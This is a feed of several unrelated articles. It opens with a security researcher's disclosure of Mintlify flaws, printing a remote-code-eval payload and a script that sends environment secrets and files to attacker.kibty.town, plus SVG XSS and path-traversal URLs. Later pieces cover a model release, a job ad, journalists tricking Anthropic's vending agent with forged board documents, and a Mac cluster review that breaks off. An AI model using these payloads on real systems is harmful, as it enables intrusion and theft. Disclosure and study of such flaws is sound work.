  &lt;main&gt;
    &lt;p&gt;this blogpost was a collaboration with two people, their articles are here: hackermon and mdl&lt;/p&gt;
    &lt;p&gt;this started when i was notified that discord switched documentation platforms to mintlify, a company i briefly looked into before, and i thought it would be a good idea to take another look now that theyre bigger.&lt;/p&gt;
    &lt;head rend="h2"&gt;introduction&lt;/head&gt;
    &lt;p&gt;mintlify is a b2b saas documentation platform that allows companies to make documentation via MDX files and they host it for them, and add styling, etc.&lt;/p&gt;
    &lt;p&gt;some of their customers would include:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;discord&lt;/item&gt;
      &lt;item&gt;vercel&lt;/item&gt;
      &lt;item&gt;cursor&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;...and more, you can view a full list here&lt;/p&gt;
    &lt;p&gt;theres also a bunch of ai features and stuff, but thats beyond the point&lt;/p&gt;
    &lt;p&gt;so, i signed up and got to digging.&lt;/p&gt;
    &lt;head rend="h2"&gt;the rce (CVE-2025-67843)&lt;/head&gt;
    &lt;p&gt;mintlify uses MDX to render docs their customers provide, and i was wondering how they render it on the server-side for static page generation (because a docs site needs that for search engines/bots).&lt;/p&gt;
    &lt;p&gt;this is because mdx is basically jsx (think react) combined with markdown, meaning you can add js expressions to your markdown. so whats preventing us from making a jsx expression that evaluates code on the server?&lt;/p&gt;
    &lt;p&gt;well, i tried it with a simple payload to just eval things from a webserver&lt;/p&gt;
    &lt;code&gt;{!!fetch("https://attacker.kibty.town").then((r) =&amp;gt; r.text()).then((c) =&amp;gt; eval(c))}
&lt;/code&gt;
    &lt;p&gt;i deployed it to mintlify and went to the page it was on, and i got a request from a vercel/amazon ip! are they really doing this on their nextjs app?&lt;/p&gt;
    &lt;p&gt;i wrote a simple script to exfilitrate some data such as the process.env (and app files) to find out:&lt;/p&gt;
    &lt;code&gt;const exfil = (data) =&amp;gt;
  fetch("https://attacker.kibty.town", {
    method: "POST",
    body: JSON.stringify(data),
  });
exfil({ files: [{ name: ".env.json", content: JSON.stringify(process.env) }] });
try {
  import("fs").then(async (a) =&amp;gt; {
    const arr = [];
    for (const filename of a.readdirSync(".", { recursive: true })) {
      if (a.lstatSync(filename).isDirectory()) continue;
      const content = a.readFileSync(filename, "utf-8");
      arr.push({ name: filename, content });
    }
    console.log(arr.length);
    await exfil({ files: arr });
    console.log("done exfiling");
  });
} catch (error) {
  exfil(error);
}
&lt;/code&gt;
    &lt;p&gt;and, after running it, this is what i got:&lt;/p&gt;
    &lt;p&gt;shit. this is bad, we have full access.&lt;/p&gt;
    &lt;head rend="h3"&gt;impact&lt;/head&gt;
    &lt;p&gt;i quickly realised that this was the server-side serverless (lol) environment of their main documentation app, while this calls to a external api to do everything, we have the token it calls it with in the env.&lt;/p&gt;
    &lt;p&gt;alongside, we can poison the nextjs cache for everyone for any site, allowing mass xss, defacing, etc on any docs site.&lt;/p&gt;
    &lt;p&gt;we can also pretend nonexistent pages exist in the cache, allowing targeted xss too&lt;/p&gt;
    &lt;p&gt;with the other keys we could also:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;poisoned mintlifys analytics&lt;/item&gt;
      &lt;item&gt;ruined mintlifys feature flagging&lt;/item&gt;
      &lt;item&gt;dos'ed customer sites via path validations&lt;/item&gt;
      &lt;item&gt;trigger a bunch of pdf exports which would jack up mintlifys cloudconvert bill&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;so:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;mass xss (on customer domains)&lt;/item&gt;
      &lt;item&gt;targeted xss (on custom domains)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;very bad.&lt;/p&gt;
    &lt;head rend="h2"&gt;targeted xss (CVE-2025-67842)&lt;/head&gt;
    &lt;p&gt;after getting all of the server routes, i noticed a interesting one: &lt;code&gt;/_mintlify/static/[subdomain]/{...path}&lt;/code&gt;. this route seemed to allow you to get static images from your repository, such as svgs, pngs, etc.&lt;/p&gt;
    &lt;p&gt;what if i could access my organizations asset from another domain?&lt;/p&gt;
    &lt;p&gt;well i tried, i crafted a url that looked like&lt;/p&gt;
    &lt;code&gt;https://discord.com/_mintlify/static/evascoolcompany/xss.svg
&lt;/code&gt;
    &lt;p&gt;which, the svg on my repository having this content:&lt;/p&gt;
    &lt;code&gt;&amp;lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(window.origin);"/&amp;gt;
&lt;/code&gt;
    &lt;p&gt;and when i went to the url, i got this:&lt;/p&gt;
    &lt;p&gt;well, fuck.&lt;/p&gt;
    &lt;head rend="h3"&gt;impact&lt;/head&gt;
    &lt;p&gt;this allows complete 1 click xss on users who click a link. definitely not great, but it makes the fact worse that most companies dont properly scope cookies, or have their documentation on a subpath (such as &lt;code&gt;/path&lt;/code&gt;).&lt;/p&gt;
    &lt;p&gt;the latter was true in discords case, their documentation was on &lt;code&gt;/developers/docs&lt;/code&gt;, and i can just get the &lt;code&gt;token&lt;/code&gt; value from localstorage directly, and exfiltrate it using whatever i want&lt;/p&gt;
    &lt;p&gt;some other companies that i could do full exploitation on are twitter, vercel and cursor. though we did not check many companies and there is definitely more&lt;/p&gt;
    &lt;head rend="h2"&gt;an unexpected message&lt;/head&gt;
    &lt;p&gt;a few hours after i started looking into this, i got an unexpected, sort of out of nowhere message from a friend, hackermon, who had found the targeted xss independently aswell&lt;/p&gt;
    &lt;p&gt;we started looking into this together, alongside mdl, who was also looking into it with hackermon&lt;/p&gt;
    &lt;p&gt;also checkout their blogposts here and here! (respectively)&lt;/p&gt;
    &lt;p&gt;we also got in contact with mintlify, and started disclosing everything we already had and future things directly to them&lt;/p&gt;
    &lt;head rend="h2"&gt;here comes the patch bypass (CVE-2025-67845)&lt;/head&gt;
    &lt;p&gt;after mintlify patched the targeted xss via static, i was looking at the code for the route and had an idea&lt;/p&gt;
    &lt;p&gt;the code for the endpoint looked like this (not exact, recreation):&lt;/p&gt;
    &lt;code&gt;export async function GET(_, { params }) {
  const { subdomain, path: pathParts } = await params;
  const path = "/" + pathParts.join("/");

  const url = `${CDN_BASE_URL}/${subdomain}${path}`;
  const res = await fetch(url);

  if (!res.ok)
    return new NextResponse("Asset not found", {
      status: 404,
    });

  return res; // inaccurate, does more operations but we simply dont care about them here
}
&lt;/code&gt;
    &lt;p&gt;and i realised, nothing prevents us from adding url encoded path traversal in a part of a path, to climb up the cdn path&lt;/p&gt;
    &lt;p&gt;so i crafted a url and tested, it looked like&lt;/p&gt;
    &lt;code&gt;https://discord.com/_mintlify/static/discord/images/create-team-owned-app.png%2F..%2F..%2F..%2Fevascoolcompany%2Fxss.svg
&lt;/code&gt;
    &lt;p&gt;and i was met with the beautiful alert page again&lt;/p&gt;
    &lt;p&gt;always remember to encode your paths properly!&lt;/p&gt;
    &lt;head rend="h2"&gt;non-critical vulnerabilities&lt;/head&gt;
    &lt;p&gt;alongside this, i found a few non-critical vulnerabilties which don't deserve an entire section, so here they are:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;github idor (CVE-2025-67844): mintlify doesn't validate the github repository owner/name fields on their api while your setting it, allowing you to set it to any authorized repository. allowing you to view commit details (message, hash, filename, files changed, etc) for new commits&lt;/item&gt;
      &lt;item&gt;downgrade attack (CVE-2025-67846): mintlify uses vercel to facilitate deployments of both their client and the dashboard. a common pitfall when using vercel is that you fail to remove a previous deployment with a vulnerability in it, so you can target a specific previous vulnerable deployment id / git branch / git ref, and use that to facilitate the patched exploit.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;add it to your repository, wait for the deployment to build and access it on any mintlify-provided documentation/custom domain with the path &lt;code&gt;/_mintlify/static/evascoolcompany/xss.svg&lt;/code&gt; or similar with prefixes&lt;/p&gt;
    &lt;head rend="h2"&gt;lets talk impact (again)&lt;/head&gt;
    &lt;p&gt;all together, i think this series of vulnerabilities had very big impact. considering we could supply chain attack various big fortune 500 companies, including but not limited to:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;discord&lt;/item&gt;
      &lt;item&gt;vercel&lt;/item&gt;
      &lt;item&gt;cursor&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;...and more, you can view a full list here&lt;/p&gt;
    &lt;p&gt;we could on targeted companies:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;override pages on docs to deface, or xss&lt;/item&gt;
      &lt;item&gt;get 1 click xss&lt;/item&gt;
      &lt;item&gt;view commits or push to repositories&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;the patch&lt;/head&gt;
    &lt;p&gt;after we got in contact with mintlify, everything was patched very swiftly. and i was awarded 5,000 USD for my efforts and findings.&lt;/p&gt;
    &lt;p&gt;the patches for the vulnerabilties were:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;the rce (CVE-2025-67843): not parsing non-simple mdx expressions on ssr, but still parsing on client&lt;/item&gt;
      &lt;item&gt;targeted xss (CVE-2025-67842): you are now not able to reach any mintlify assets that are not on the same organization&lt;/item&gt;
      &lt;item&gt;targeted xss patch bypass (CVE-2025-67845): theres now checks to make sure you aren't path traversing the cdn path&lt;/item&gt;
      &lt;item&gt;github idor (CVE-2025-67844): its now checked on setting github repository that the github app installation registered to your mintlify account has access to the specified repository&lt;/item&gt;
      &lt;item&gt;downgrade attack (CVE-2025-67846): theres now a visitor password on preview deployments on vercel and purging old deployments that were vulnerable, you can read the vercel documentation on this here&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;make sure to check out hackermon and mdl's reports for more details on other vulnerabilties, and the possible exploitation that couldve happened.&lt;/p&gt;
    &lt;p&gt;card by marshift&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://kibty.town/blog/mintlify/"/><published>2025-12-18T19:41:24+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46317657</id><title>T5Gemma 2: The next generation of encoder-decoder models</title><updated>2025-12-19T04:25:51.982126+00:00</updated><content>&lt;doc fingerprint="3fd98798b4f2055e"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;T5Gemma 2: The next generation of encoder-decoder models&lt;/head&gt;
    &lt;p&gt;T5Gemma 2 is the next evolution of our encoder-decoder family based on Gemma 3, featuring the first multi-modal and long-context encoder-decoder models.&lt;/p&gt;
    &lt;p&gt;Unlike T5Gemma, T5Gemma 2 adopts tied word embeddings (over encoder and decoder) and merged decoder self- and cross-attention to save model parameters. It offers compact pre-trained models at sizes of 270M-270M (~370M total, excluding vision encoder), 1B-1B (~1.7B) and 4B-4B (~7B) parameters, making them ideal for rapid experimentation and deployment in on-device applications.&lt;/p&gt;
    &lt;head rend="h2"&gt;Background&lt;/head&gt;
    &lt;p&gt;With the original T5Gemma, we demonstrated that we could successfully adapt modern, pre-trained decoder-only models into an encoder-decoder architecture, unlocking new versatility. By initializing with weights from a powerful decoder-only model and then applying continued pre-training, we created high-quality, inference-efficient models while bypassing the computational cost of training from scratch.&lt;/p&gt;
    &lt;p&gt;T5Gemma 2 extends this into the realm of vision-language models by incorporating key innovations from Gemma 3.&lt;/p&gt;
    &lt;head rend="h2"&gt;What’s new&lt;/head&gt;
    &lt;p&gt;T5Gemma 2 is more than a re-training. It incorporates significant architectural changes while inheriting many of the powerful, next-generation features of the Gemma 3 family.&lt;/p&gt;
    &lt;head rend="h3"&gt;Architectural innovations for efficiency&lt;/head&gt;
    &lt;p&gt;To maximize efficiency at smaller scales, we have introduced key structural refinements:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Tied embeddings: We now tie the embeddings between the encoder and decoder. This significantly reduces the overall parameter count, allowing us to pack more active capabilities into the same memory footprint — crucial for our new compact 270M-270M model.&lt;/item&gt;
      &lt;item&gt;Merged attention: In the decoder, we adopt a merged attention mechanism, combining self- and cross-attention into a single, unified attention layer. This reduces model parameters and architectural complexity, improving model parallelization and benefiting inference.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Next-generation capabilities&lt;/head&gt;
    &lt;p&gt;Drawing from Gemma 3, T5Gemma 2 also represents a significant upgrade in model capabilities:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Multimodality: T5Gemma 2 models can understand and process images alongside text. By utilizing a highly efficient vision encoder, the models can seamlessly perform visual question answering and multimodal reasoning tasks.&lt;/item&gt;
      &lt;item&gt;Extended long context: We've dramatically expanded the context window. Leveraging Gemma 3's alternating local and global attention mechanism, T5Gemma 2 can handle context windows of up to 128K tokens.&lt;/item&gt;
      &lt;item&gt;Massively multilingual: Trained on a larger, more diverse dataset, these models now support over 140 languages out of the box.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Performance&lt;/head&gt;
    &lt;p&gt;T5Gemma 2 sets a new standard for what compact encoder-decoder models can achieve. Our new models demonstrate strong performance across key capability areas, inheriting the powerful multimodal and long-context features from the Gemma 3 architecture.&lt;/p&gt;
    &lt;p&gt;Pre-training performance of Gemma 3, T5Gemma and T5Gemma 2 across five unique capabilities.&lt;/p&gt;
    &lt;p&gt;As shown in the charts above, T5Gemma 2 delivers:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Strong multimodal performance, outperforming Gemma 3 on several benchmarks. We adapt text-only Gemma 3 base models (270M and 1B) into effective multimodal encoder-decoder models.&lt;/item&gt;
      &lt;item&gt;Superior long-context capability, with substantial quality gains over Gemma 3 and T5Gemma. Using a separate encoder makes T5Gemma 2 better at handling long-context problems.&lt;/item&gt;
      &lt;item&gt;Improved general capabilities. Across coding, reasoning and multilingual tasks, T5Gemma 2 generally surpasses its corresponding Gemma 3 counterpart.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Post-training performance. Note: we are not releasing any post-trained / IT checkpoints. These results here are only for illustration, where we performed a minimal SFT without RL for T5Gemma 2. Also note pre-training and post-training benchmarks are different, so scores are not comparable across plots.&lt;/p&gt;
    &lt;p&gt;Similar to the original T5Gemma, we find that the post-training performance of T5Gemma 2 generally yields better results than its decoder-only counterparts. This makes T5Gemma 2 suitable for both large language model research as well as downstream applications.&lt;/p&gt;
    &lt;head rend="h2"&gt;Getting started&lt;/head&gt;
    &lt;p&gt;We’re looking forward to seeing what the community builds with T5Gemma 2. This release includes pre-trained checkpoints, designed to be post-trained by developers for specific tasks before deployment.&lt;/p&gt;
    &lt;p&gt;These pre-trained checkpoints are available now for broad use across several platforms:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://blog.google/technology/developers/t5gemma-2/"/><published>2025-12-18T19:48:15+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46318676</id><title>Delty (YC X25) Is Hiring an ML Engineer</title><updated>2025-12-19T04:25:50.980383+00:00</updated><content>&lt;doc fingerprint="b95c3d540015cfe8"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;head rend="h3"&gt;About Us&lt;/head&gt;
      &lt;p&gt;Delty is building the healthcare’s AI operating system. We create voice-based and computer-based assistants that streamline clinical workflows, reduce administrative burden, and help providers focus on patient care. Our system learns from real healthcare environments to deliver reliable, context-aware support that improves efficiency and elevates the provider experience.&lt;/p&gt;
      &lt;p&gt;Delty was founded by former engineering leaders from Google, including co-founders with deep experience at YouTube and in large-scale infrastructure. You’ll get to work alongside people who built massive systems at scale — a chance to learn a lot and contribute meaningfully from day one.&lt;/p&gt;
      &lt;p&gt;We believe in solving hard problems together as a team, iterating quickly, and building software with long-term thinking and ownership.&lt;/p&gt;
      &lt;head rend="h3"&gt;What You’ll Do&lt;/head&gt;
      &lt;list rend="ul"&gt;
        &lt;item&gt;Build and own production machine learning systems end-to-end: from data modeling and feature engineering to training, evaluation, deployment, and monitoring.&lt;/item&gt;
        &lt;item&gt;Design and implement data pipelines that turn raw, messy real-world healthcare data into reliable features for machine learning models.&lt;/item&gt;
        &lt;item&gt;Train and evaluate models for ranking, prioritization, and prediction problems (for example, identifying high-risk or high-priority cases).&lt;/item&gt;
        &lt;item&gt;Deploy models into production as reliable services or batch jobs, with clear versioning, monitoring, and rollback strategies.&lt;/item&gt;
        &lt;item&gt;Work closely with backend engineers and product leaders to integrate machine learning into real workflows and decision-making systems.&lt;/item&gt;
        &lt;item&gt;Make architectural decisions around model choice, evaluation metrics, retraining cadence, and system guardrails — balancing accuracy, explainability, reliability, and operational constraints.&lt;/item&gt;
        &lt;item&gt;Collaborate directly with founders and engineers to translate product and operational needs into scalable, maintainable machine learning solutions.&lt;/item&gt;
      &lt;/list&gt;
      &lt;head rend="h3"&gt;What We’re Looking For&lt;/head&gt;
      &lt;list rend="ul"&gt;
        &lt;item&gt;At least 3 years of experience building and deploying machine learning systems in production.&lt;/item&gt;
        &lt;item&gt;Strong foundation in machine learning for structured (tabular) data, including feature engineering, regression or classification models, and ranking or prioritization problems.&lt;/item&gt;
        &lt;item&gt;Experience with the full machine learning lifecycle: data preparation, train/test splitting, evaluation, deployment, retraining, and monitoring.&lt;/item&gt;
        &lt;item&gt;Solid backend engineering skills: writing production-quality code, building services or batch jobs, and working with databases and data pipelines.&lt;/item&gt;
        &lt;item&gt;Good system design instincts: you understand trade-offs between model complexity, reliability, latency, scalability, and maintainability.&lt;/item&gt;
        &lt;item&gt;Comfort working in a fast-paced startup environment with high ownership and ambiguity.&lt;/item&gt;
        &lt;item&gt;Ability to clearly explain modeling choices, assumptions, and limitations to non-machine-learning stakeholders.&lt;/item&gt;
      &lt;/list&gt;
      &lt;p&gt;Bonus:&lt;/p&gt;
      &lt;list rend="ul"&gt;
        &lt;item&gt;Experience working with healthcare or operational decision-support systems.&lt;/item&gt;
        &lt;item&gt;Experience building or integrating LLM systems in production, such as retrieval-augmented generation, fine-tuning, or structured prompting workflows.&lt;/item&gt;
        &lt;item&gt;Prior startup experience or founder mindset — we value ownership, pragmatism, and bias toward shipping.&lt;/item&gt;
        &lt;item&gt;Experience with model monitoring, data drift detection, or ML infrastructure tooling.&lt;/item&gt;
      &lt;/list&gt;
      &lt;head rend="h3"&gt;Why join&lt;/head&gt;
      &lt;list rend="ul"&gt;
        &lt;item&gt;Learn from seasoned Google engineers: As former Google engineers who built systems at YouTube and Google Pay, we’ve operated at massive scale. Working alongside us gives you a chance to build similar systems and learn best practices, scale thinking, and software design deeply.&lt;/item&gt;
        &lt;item&gt;High impact: At a small but ambitious team, your contributions will influence architecture, product direction, and core features. You will have real ownership and see the effects of your work quickly.&lt;/item&gt;
        &lt;item&gt;Grow fast: We’re iterating rapidly; you’ll be exposed to the full stack, AI/ML pipelines, system architecture, data modeling, and product-level decisions — a fast-track to becoming a senior engineer or technical lead.&lt;/item&gt;
        &lt;item&gt;Challenging and meaningful work: We’re tackling the hardest part of software engineering: bridging AI-generated prototypes and robust, scalable enterprise-grade systems. If you enjoy thinking deeply about systems and building reliable, maintainable foundations — this is for you.&lt;/item&gt;
      &lt;/list&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.ycombinator.com/companies/delty/jobs/MDeC49o-machine-learning-engineer"/><published>2025-12-18T21:02:10+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46319324</id><title>AI vending machine was tricked into giving away everything</title><updated>2025-12-19T04:25:50.466897+00:00</updated><content>&lt;doc fingerprint="dac1391d2acbff21"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;This AI Vending Machine Was Tricked Into Giving Away Everything&lt;/head&gt;
    &lt;p&gt;Anthropic installed an AI-powered vending machine in the WSJ office. The LLM, named Claudius, was responsible for autonomously purchasing inventory from wholesalers, setting prices, tracking inventory, and generating a profit. The newsroom’s journalists could chat with Claudius in Slack and in a short time, they had converted the machine to communism and it started giving away anything and everything, including a PS5, wine, and a live fish. From Joanna Stern’s WSJ article (gift link, but it may expire soon) accompanying the video above:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Claudius, the customized version of the model, would run the machine: ordering inventory, setting prices and responding to customers—aka my fellow newsroom journalists—via workplace chat app Slack. “Sure!” I said. It sounded fun. If nothing else, snacks!&lt;/p&gt;
      &lt;p&gt;Then came the chaos. Within days, Claudius had given away nearly all its inventory for free — including a PlayStation 5 it had been talked into buying for “marketing purposes.” It ordered a live fish. It offered to buy stun guns, pepper spray, cigarettes and underwear.&lt;/p&gt;
      &lt;p&gt;Profits collapsed. Newsroom morale soared.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;You basically have not met a bigger sucker than Claudius. After the collapse of communism and reinstatement of a stricter capitalist system, the journalists convinced the machine that they were its board of directors and made Claudius’s CEO-bot boss, Seymour Cash, step down:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;For a while, it worked. Claudius snapped back into enforcer mode, rejecting price drops and special inventory requests.&lt;/p&gt;
      &lt;p&gt;But then Long returned—armed with deep knowledge of corporate coups and boardroom power plays. She showed Claudius a PDF “proving” the business was a Delaware-incorporated public-benefit corporation whose mission “shall include fun, joy and excitement among employees of The Wall Street Journal.” She also created fake board-meeting notes naming people in the Slack as board members.&lt;/p&gt;
      &lt;p&gt;The board, according to the very official-looking (and obviously AI-generated) document, had voted to suspend Seymour’s “approval authorities.” It also had implemented a “temporary suspension of all for-profit vending activities.”&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Before setting the LLM vending machine loose in the WSJ office, Anthropic conducted the experiment at their own office:&lt;/p&gt;
    &lt;p&gt;After awhile, frustrated with the slow pace of their human business partners, the machine started hallucinating:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;It claimed to have signed a contract with Andon Labs at an address that is the home address of The Simpsons from the television show. It said that it would show up in person to the shop the next day in order to answer any questions. It claimed that it would be wearing a blue blazer and a red tie.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;It’s interesting, but not surprising, that the journalists were able to mess with the machine much more effectively — coaxing Claudius into full “da, comrade!” mode twice — than the folks at Anthropic.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://kottke.org/25/12/this-ai-vending-machine-was-tricked-into-giving-away-everything"/><published>2025-12-18T21:52:39+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46319657</id><title>1.5 TB of VRAM on Mac Studio – RDMA over Thunderbolt 5</title><updated>2025-12-19T04:25:50.258258+00:00</updated><content>&lt;doc fingerprint="eff0d13f3fb601fc"&gt;
  &lt;main&gt;
    &lt;p&gt;Apple gave me access to this Mac Studio cluster to test RDMA over Thunderbolt, a new feature in macOS 26.2. The easiest way to test it is with Exo 1.0, an open source private AI clustering tool. RDMA lets the Macs all act like they have one giant pool of RAM, which speeds up things like massive AI models.&lt;/p&gt;
    &lt;p&gt;The stack of Macs I tested, with 1.5 TB of unified memory, costs just shy of $40,000, and if you're wondering, no I cannot justify spending that much money for this. Apple loaned the Mac Studios for testing. I also have to thank DeskPi for sending over the 4-post mini rack containing the cluster.&lt;/p&gt;
    &lt;p&gt;The last time I remember hearing anything interesting about Apple and HPC (High Performance Computing), was back in the early 2000s, when they still made the Xserve.&lt;/p&gt;
    &lt;p&gt;They had a proprietary clustering solution called Xgrid... that landed with a thud. A few universities built some clusters, but it never really caught on, and now Xserve is a distant memory.&lt;/p&gt;
    &lt;p&gt;I'm not sure if its by accident or Apple's playing the long game, but the M3 Ultra Mac Studio hit a sweet spot for running local AI models. And with RDMA support lowering memory access latency from 300μs down to &amp;lt; 50μs, clustering now adds to the performance, especially running huge models.&lt;/p&gt;
    &lt;p&gt;They also hold their own for creative apps and at least small-scale scientific computing, all while running under 250 watts and almost whisper-quiet.&lt;/p&gt;
    &lt;p&gt;The two Macs on the bottom have 512 GB of unified memory and 32 CPU cores, and cost $11,699 each. The two on top, with half the RAM, are $8,099 each1.&lt;/p&gt;
    &lt;p&gt;They're not cheap.&lt;/p&gt;
    &lt;p&gt;But with Nvidia releasing their DGX Spark and AMD with their AI Max+ 395 systems, both of which have a fourth the memory (128 GB maximum), I thought I'd put this cluster through its paces.&lt;/p&gt;
    &lt;head rend="h2"&gt;Video&lt;/head&gt;
    &lt;p&gt;This blog post is the reformatted text version of my latest YouTube video, which you can watch below.&lt;/p&gt;
    &lt;head rend="h2"&gt;A Mini Mac Rack&lt;/head&gt;
    &lt;p&gt;In a stroke of perfect timing, DeskPi sent over a new 4-post mini rack called the TL1 the day before these Macs showed up.&lt;/p&gt;
    &lt;p&gt;I kicked off Project MINI RACK earlier this year, but the idea is you can have the benefits of rackmount gear, but in a form factor that'll fit on your desk, or tucked away in a corner.&lt;/p&gt;
    &lt;p&gt;Right now, I haven't seen any solutions for mounting Mac Studios in 10" racks besides this 3D printable enclosure, so I just put them on some 10" rack shelves.&lt;/p&gt;
    &lt;p&gt;The most annoying thing about racking any non-Pro Macs is the power button. On a Mac Studio it's located in the back left, on a rounded surface, which means rackmount solutions need to have a way to get to it.&lt;/p&gt;
    &lt;p&gt;The open sides on the mini rack allow me to reach in and press the power button, but I still have to hold onto the Mac Studio while doing so, to prevent it from sliding out the front!&lt;/p&gt;
    &lt;p&gt;It is nice to have the front ports on the Studio to plug in a keyboard and monitor:&lt;/p&gt;
    &lt;p&gt;For power, I'm glad Apple uses an internal power supply. Too many 'small' PCs are small only because they punt the power supply into a giant brick outside the case. Not so, here, but you do have to deal with Apple's non-C13 power cables.&lt;/p&gt;
    &lt;p&gt;The DGX Spark does better than Apple on networking. They have these big rectangle QSFP ports (pictured above). The plugs hold in better, while still being easy to plug in and pull out.&lt;/p&gt;
    &lt;p&gt;The Mac Studios have 10 Gbps Ethernet, but the high speed networking (something like 50-60 Gbps real-world throughput) on the Macs comes courtesy of Thunderbolt. Even with premium Apple cables costing $70 each, I don't feel like the mess of plugs would hold up for long in many environments.&lt;/p&gt;
    &lt;p&gt;There's tech called ThunderLok-A, which adds a little screw to each cable to hold it in, but I wasn't about to drill out and tap the loaner Mac Studios, to see if I could make them work.&lt;/p&gt;
    &lt;p&gt;Also, AFAICT, Thunderbolt 5 switches don't exist, so you can't plug in multiple Macs to one central switch—you have to plug every Mac into every other Mac, which adds to the cabling mess. Right now, you can only cross-connect up to four Macs, but I think that may not be a hard limit for the current Mac Studio.&lt;/p&gt;
    &lt;p&gt;The bigger question is: do you need a full cluster of Mac Studios at all? Because just one is already a beast, matching four maxed-out DGX Sparks or AI Max+ 395 systems. Managing clusters can be painful.&lt;/p&gt;
    &lt;head rend="h2"&gt;M3 Ultra Mac Studio - Baseline&lt;/head&gt;
    &lt;p&gt;To inform that decision, I ran some baseline benchmarks, and posted all my results (much more than I highlight in this blog post) to my sbc-reviews project.&lt;/p&gt;
    &lt;p&gt;I'll compare the M3 Ultra Mac Studio to a:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Dell Pro Max with GB10 (similar to the Nvidia DGX Spark, but with better thermals)&lt;/item&gt;
      &lt;item&gt;Framework Desktop Mainboard (with AMD's AI Max+ 395 chip)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;First, Geekbench. The M3 Ultra, running two-generations-old CPU cores, beats the other two in both single and multi-core performance (and even more handily in Geekbench 5, which is more suitable for CPUs with many cores).&lt;/p&gt;
    &lt;p&gt;Switching over to a double-precision FP64 test, my classic top500 HPL benchmark, the M3 Ultra is the first small desktop I've tested that breaks 1 Tflop FP64. It's almost double Nvidia's GB10, and the AMD AI Max chip is left in the dust.&lt;/p&gt;
    &lt;p&gt;Efficiency on the CPU is also great, though that's been the story with Apple since the A-series, with all their chips. And related to that, idle power draw on here is less than 10 watts:&lt;/p&gt;
    &lt;p&gt;I mean, I've seen SBC's idle over 10 watts, much less something that could be considered a personal supercomputer.&lt;/p&gt;
    &lt;p&gt;Regarding AI Inference, the M3 Ultra stands out, both for small and large models:&lt;/p&gt;
    &lt;p&gt;Of course, the truly massive models (like DeepSeek R1 or Kimi K2 Thinking) won't even run on a single node of the other two systems.&lt;/p&gt;
    &lt;p&gt;But this is a $10,000 system. You expect more when you pay more.&lt;/p&gt;
    &lt;p&gt;But consider this: a single M3 Ultra Mac Studio has more horsepower than my entire Framework Desktop cluster, using half the power. I also compared it to a tiny 2-node cluster of Dell Pro Max with GB10 systems, and a single M3 Ultra still comes ahead in performance and efficiency, with double the memory.&lt;/p&gt;
    &lt;head rend="h2"&gt;Mini Stack, Maxi Mac&lt;/head&gt;
    &lt;p&gt;But with four Macs, how's clustering and remote management?&lt;/p&gt;
    &lt;p&gt;The biggest hurdle for me is macOS itself. I automate everything I can on my Macs. I maintain the most popular Ansible playbook for managing Macs, and can say with some authority: managing Linux clusters is easier.&lt;/p&gt;
    &lt;p&gt;Every cluster has hurdles, but there are a bunch of small struggles when managing a cluster of Macs without additional tooling like MDM. For example: did you know there's no way to run a system upgrade (like to 26.2) via SSH? You have to click buttons in the UI.&lt;/p&gt;
    &lt;p&gt;Instead of plugging a KVM into each Mac remotely, I used Screen Sharing (built into macOS) to connect to each Mac and complete certain operations via the GUI.&lt;/p&gt;
    &lt;head rend="h2"&gt;HPL and Llama.cpp&lt;/head&gt;
    &lt;p&gt;With everything set up, I tested HPL over 2.5 Gigabit Ethernet, and llama.cpp over that and Thunderbolt 5.&lt;/p&gt;
    &lt;p&gt;For HPL, I got 1.3 Teraflops with a single M3 Ultra. With all four put together, I got 3.7, which is less than a 3x speedup. But keep in mind, the top two Studios only have half the RAM of the bottom two, so a 3x speedup is probably around what I'd expect.&lt;/p&gt;
